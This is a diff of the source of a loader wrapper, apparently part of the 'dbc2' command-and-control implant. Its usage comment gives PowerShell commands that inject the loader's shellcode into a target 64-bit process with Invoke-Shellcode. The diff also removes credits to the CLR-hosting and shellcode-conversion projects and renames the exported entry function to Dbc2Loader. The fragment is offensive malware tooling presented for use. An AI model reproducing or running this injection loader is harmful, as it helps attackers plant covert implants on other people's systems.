@@ -38,13 +38,6 @@ To get the shellcode as a binary file:
 Example of injecting the shellcode:
 	PS c:\> ipmo Invoke-Shellcode.ps1
 	PS c:\> Invoke-Shellcode -Shellcode (Get-Content .\dbc2LoaderWrapperCLR_x64.bin -Encoding byte) -ProcessID <ID of a 64 bits process>
-	
-=============================== CREDITS ===============================
-	Lee Christensen for creating and hosting the CLR in native code, then loading and executing a .Net assembly
-	https://github.com/leechristensen/UnmanagedPowerShell
-
-	Nick Landers for sRDI, used for transforming a native DLL to position independant shellcode 
-	https://github.com/monoxgas/sRDI
 */
 
 #pragma region Includes and Imports
@@ -206,7 +199,7 @@ HRESULT createHost(const wchar_t* version, ICorRuntimeHost** ppCorRuntimeHost)
 // Exported function
 // The passed arguments are passed to the 'dbc2loader.dbc2loader.entryPoint' function
 //=======================================================================================
-extern "C" __declspec(dllexport) int SayHello(wchar_t* argument)
+extern "C" __declspec(dllexport) int Dbc2Loader(wchar_t* argument)
 {
 	//Debug
 	//MessageBoxW(NULL,argument,L"Debug",0);
